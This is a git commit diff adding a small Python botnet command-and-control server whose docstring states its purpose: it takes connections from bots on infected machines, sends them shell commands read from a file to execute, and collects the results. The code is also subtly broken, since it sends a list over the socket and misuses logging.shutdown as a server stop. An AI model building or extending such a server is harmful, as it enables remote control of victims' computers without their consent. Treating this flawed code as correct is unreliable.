cffa95a01af47b17c9268d7b96e813bb950256b7
Cody Clark <cody.t.clark@gmail.com>
2022-01-31 19:15:57 -0700

    Finished botHandler.py

--- botHandler.py
+++ botHandler.py
@@ -1,16 +1,39 @@
+'''
+This is a CNC server for controlling a botnet. 
+The following will be executed once a bot connects:
+1) A bot on a client machine will connect to this server and send them some initial info
+2) The server will read commands located within the commands.sh file
+3) The server will send those commands to the client bot
+4) The client bot will exicute those commands
+5) The server will receive the results from the bot
+'''
+
+from logging import shutdown
 import socketserver
+import threading
 
 class BotHandler(socketserver.BaseRequestHandler):
+    
     def handle(self):
+        # Receive any initial data
         self.data = self.request.recv(1024).strip()
         print("Bot with IP {} sent:".format(self.client_address[0]))
         print(self.data)
-        self.request.sendall(self.data.upper())
+        # Send the bot commands
+        commands = open("commands.sh", "r").readlines()
+        self.request.sendall(commands)
+        # Read the results of the commands sent
+        self.data = self.request.recv(1024).strip()
+        print("Bot with IP {} sent:".format(self.client_address[0]))
+        print(self.data)
+        shutdown()
 
 if __name__ == "__main__":
     HOST, PORT = "", 8000
     tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
     try:
         tcpServer.serve_forever()
+        shutdown()
     except:
         print("There was an error")
+        shutdown()
